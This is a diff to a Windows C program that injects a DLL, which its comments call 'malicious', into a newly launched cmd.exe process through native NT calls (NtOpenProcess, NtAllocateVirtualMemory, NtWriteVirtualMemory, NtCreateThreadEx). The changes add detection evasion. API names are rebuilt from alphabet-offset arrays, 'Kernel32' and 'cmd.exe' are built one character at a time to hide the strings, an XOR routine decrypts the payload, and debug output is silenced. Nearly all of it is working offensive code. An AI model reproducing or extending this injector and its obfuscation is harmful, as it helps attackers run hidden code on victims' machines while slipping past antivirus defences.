@@ -2,7 +2,8 @@
 #include "native.h"
 #include <stdlib.h>
 #include <tlhelp32.h>
-
+#include <Dbghelp.h>
+#include <wchar.h> 
 
 /*
 what this code should do?
@@ -56,13 +57,13 @@ HANDLE get_proc_handle(
 						)
 {	
 	HANDLE hProcess;
-	printf("[NtOpenProcess] Getting Process..\n");
+	//printf("[NtOpenProcess] Getting Process..\n");
 	STATUS = NT_OpenProcess(&hProcess,PROCESS_ALL_ACCESS,&Object_Attr,&CID);
 	if (STATUS != STATUS_SUCCESS) {
-		printf("[NtOpenProcess] Failed to get handle to process, error 0x%lx\n", STATUS);
+		//printf("[NtOpenProcess] Failed to get handle to process, error 0x%lx\n", STATUS);
 		exit(1);
 	}
-	printf("[NtOpenProcess] Got Handle to process! (%p)\n",hProcess);
+	//printf("[NtOpenProcess] Got Handle to process! (%p)\n",hProcess);
 	return hProcess;
 }
 
@@ -126,6 +127,15 @@ BOOL d11_magik(
 	return TRUE;
 }
 
+void decrypt(unsigned char *data, SIZE_T data_size, char key) {
+	//printf("[+] DECRYPTING with '%c' key\n", key);
+	for (int i = 0; i < data_size; i++) {
+		//printf("\\x%02x", data[i] ^ key);
+		data[i] = data[i] ^ key;
+	}
+	printf("\n");
+}
+
 int main(int argc , char **argv){
 	
 	// --- START GET malicious dll path --- //
@@ -151,7 +161,27 @@ int main(int argc , char **argv){
 	char ALL_ALPHANUM[]="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789._";
 
 	//HMODULE hNTDLL = Get_Module(L"NTDLL");
-	HMODULE hK32 = Get_Module(L"Kernel32");
+	wchar_t full_string_mod_1[100];	// L"Kernel32"
+	wchar_t part_mod_1_1[] = L"K";
+	wchar_t part_mod_1_2[] = L"e";
+	wchar_t part_mod_1_3[] = L"r";
+	wchar_t part_mod_1_4[] = L"n";
+	wchar_t part_mod_1_5[] = L"e";
+	wchar_t part_mod_1_6[] = L"l";
+	wchar_t part_mod_1_7[] = L"3";
+	wchar_t part_mod_1_8[] = L"2";
+	//printf("size of /shellcode.bin -> %d\n",sizeof(L"shellcode.bin"));
+	wcscpy(full_string_mod_1, part_mod_1_1);
+	wcscat(full_string_mod_1, part_mod_1_2);
+	wcscat(full_string_mod_1, part_mod_1_3);
+	wcscat(full_string_mod_1, part_mod_1_4);
+	wcscat(full_string_mod_1, part_mod_1_5);
+	wcscat(full_string_mod_1, part_mod_1_6);
+	wcscat(full_string_mod_1, part_mod_1_7);
+	wcscat(full_string_mod_1, part_mod_1_8);
+
+	
+	HMODULE hK32 = Get_Module(full_string_mod_1);
 	// --- END INIT VARS ---//
 	
 	// --- START INIT STRUCTS ---//
@@ -167,6 +197,14 @@ int main(int argc , char **argv){
 	int proc_next_offset[] = {41,17,14,2,4,18,18,55,54,39,4,23,19};
 	int mutex_create_offset[] = {28,17,4,0,19,4,38,20,19,4,23,26};
 	int cr_proc_offset[] = {28,17,4,0,19,4,41,17,14,2,4,18,18,26};
+	int nt_open_proc_offset[] = {39,19,40,15,4,13,41,17,14,2,4,18,18};
+	int nt_cr_thrd_ex_offset[] = {39,19,28,17,4,0,19,4,45,7,17,4,0,3,30,23};
+	int nt_close_offset[] = {39,19,28,11,14,18,4};
+	int nt_alloc_mem_offset[] = {39,19,26,11,11,14,2,0,19,4,47,8,17,19,20,0,11,38,4,12,14,17,24};
+	int nt_wr_mem_offset[] = {39,19,48,17,8,19,4,47,8,17,19,20,0,11,38,4,12,14,17,24};
+	int nt_prtct_mem_offset[] = {39,19,41,17,14,19,4,2,19,47,8,17,19,20,0,11,38,4,12,14,17,24};
+	int nt_wt_fr_single_obj_offset[] = {39,19,48,0,8,19,31,14,17,44,8,13,6,11,4,40,1,9,4,2,19};
+	int nt_free_mem_offset[] = {39,19,31,17,4,4,47,8,17,19,20,0,11,38,4,12,14,17,24};
 	// --- END OFFSETS --- //
 	
 	// --- START GET LoadLibraryA function ---//
@@ -193,15 +231,16 @@ int main(int argc , char **argv){
 	
 	// --- START FUNCTION PROTOTYPES INIT --- //
 	//printf("[+] getting prototypes ready...\n");
-	NtOpenProcess NT_OpenProcess = (NtOpenProcess)GetProcAddress(hDLL_n__t, "NtOpenProcess"); 
+	
+	NtOpenProcess NT_OpenProcess = (NtOpenProcess)GetProcAddress(hDLL_n__t, GetOriginal(nt_open_proc_offset,ALL_ALPHANUM,sizeof(nt_open_proc_offset))); 
+	NtCreateThreadEx NT_CreateThreadEx = (NtCreateThreadEx)GetProcAddress(hDLL_n__t, GetOriginal(nt_cr_thrd_ex_offset,ALL_ALPHANUM,sizeof(nt_cr_thrd_ex_offset))); 
+	NtClose NT_Close = (NtClose)GetProcAddress(hDLL_n__t, GetOriginal(nt_close_offset,ALL_ALPHANUM,sizeof(nt_close_offset)));
+	NtAllocateVirtualMemory NT_VirtualAlloc = (NtAllocateVirtualMemory)GetProcAddress(hDLL_n__t,GetOriginal(nt_alloc_mem_offset,ALL_ALPHANUM,sizeof(nt_alloc_mem_offset)));	
+	NtWriteVirtualMemory NT_WriteVirtualMemory = (NtWriteVirtualMemory)GetProcAddress(hDLL_n__t,GetOriginal(nt_wr_mem_offset,ALL_ALPHANUM,sizeof(nt_wr_mem_offset)));		
+	NtProtectVirtualMemory NT_ProtectVirtualMemory = (NtProtectVirtualMemory)GetProcAddress(hDLL_n__t,GetOriginal(nt_prtct_mem_offset,ALL_ALPHANUM,sizeof(nt_prtct_mem_offset)));	
+	NtWaitForSingleObject NT_WaitForSingleObject = (NtWaitForSingleObject)GetProcAddress(hDLL_n__t,GetOriginal(nt_wt_fr_single_obj_offset,ALL_ALPHANUM,sizeof(nt_wt_fr_single_obj_offset)));
+	NtFreeVirtualMemory NT_FreeVirtualMemory = (NtFreeVirtualMemory)GetProcAddress(hDLL_n__t,GetOriginal(nt_free_mem_offset,ALL_ALPHANUM,sizeof(nt_free_mem_offset)));
 	//NtCreateProcessEx NT_CreateProcessEx = (NtCreateProcessEx)GetProcAddress(hDLL_n__t,"NtCreateProcessEx");
-	NtCreateThreadEx NT_CreateThreadEx = (NtCreateThreadEx)GetProcAddress(hDLL_n__t, "NtCreateThreadEx"); 
-	NtClose NT_Close = (NtClose)GetProcAddress(hDLL_n__t, "NtClose");
-	NtAllocateVirtualMemory NT_VirtualAlloc = (NtAllocateVirtualMemory)GetProcAddress(hDLL_n__t,"NtAllocateVirtualMemory");	
-	NtWriteVirtualMemory NT_WriteVirtualMemory = (NtWriteVirtualMemory)GetProcAddress(hDLL_n__t,"NtWriteVirtualMemory");		
-	NtProtectVirtualMemory NT_ProtectVirtualMemory = (NtProtectVirtualMemory)GetProcAddress(hDLL_n__t,"NtProtectVirtualMemory");	
-	NtWaitForSingleObject NT_WaitForSingleObject = (NtWaitForSingleObject)GetProcAddress(hDLL_n__t,"NtWaitForSingleObject");
-	NtFreeVirtualMemory NT_FreeVirtualMemory = (NtFreeVirtualMemory)GetProcAddress(hDLL_n__t,"NtFreeVirtualMemory");
 	//NtOpenMutant NT_OpenMutant = (NtOpenMutant)GetProcAddress(hDLL_n__t,full_func_2);
 	//NtCreateMutant NT_CreateMutant = (NtCreateMutant)GetProcAddress(hDLL_n__t,full_func_3);
 	//FARPROC create_snap_func = GetProcAddress(hDLL_k_er_32,GetOriginal(create_snap_offset,ALL_ALPHANUM,sizeof(create_snap_offset)));
@@ -225,10 +264,28 @@ int main(int argc , char **argv){
     // Initialize the PROCESS_INFORMATION structure
     ZeroMemory(&pi, sizeof(pi));
 
-    // Launch notepad.exe using CreateProcessA
+	char full_string_1[10];	// cmd.exe
+	char part_string_1_1[] = "c";
+	char part_string_1_2[] = "m";
+	char part_string_1_3[] = "d";
+	char part_string_1_4[] = ".";
+	char part_string_1_5[] = "e";
+	char part_string_1_6[] = "x";
+	char part_string_1_7[] = "e";
+	strcpy(full_string_1, part_string_1_1);
+	strcat(full_string_1, part_string_1_2);
+	strcat(full_string_1, part_string_1_3);
+	strcat(full_string_1, part_string_1_4);
+	strcat(full_string_1, part_string_1_5);
+	strcat(full_string_1, part_string_1_6);
+	strcat(full_string_1, part_string_1_7);
+	//printf("%s\n",full_string_1);
+
+
+    // Launch cmd.exe using CreateProcessA
     if (cr_proc_func(
             NULL,                // Application name (NULL means use the command line)
-            "cmd.exe",       // Command line (the program to execute)
+            full_string_1,       // Command line (the program to execute)
             NULL,                // Process security attributes
             NULL,                // Thread security attributes
             FALSE,               // Inherit handles (false means no)
@@ -239,11 +296,11 @@ int main(int argc , char **argv){
             &pi                  // Pointer to PROCESS_INFORMATION
         ) == 0) {
         // If CreateProcessA fails
-        //printf("CreateProcess failed with error code: %lu\n", GetLastError());
+        printf("CreateProcess failed with error code: %lu\n", GetLastError());
         return 1;
     }
     // Successfully created the process
-    //printf("Process created successfully. PID: %lu\n", pi.dwProcessId);
+    printf("Process created successfully. PID: %lu\n", pi.dwProcessId);
 	
 	
 	CLIENT_ID CID;
@@ -254,7 +311,14 @@ int main(int argc , char **argv){
 	ZeroMemory(&Object_Attr, sizeof(ObjectAttributes));
 	Object_Attr.Length = sizeof(ObjectAttributes);
 
+	
+
+	
 	hProcess = get_proc_handle(CID,Object_Attr,NT_OpenProcess);
+	
+	
+	
+	
 	
     if ( !allocate_mem(hProcess,&Buffer,dll_size,NT_VirtualAlloc) ){
 		goto CLEANUP;
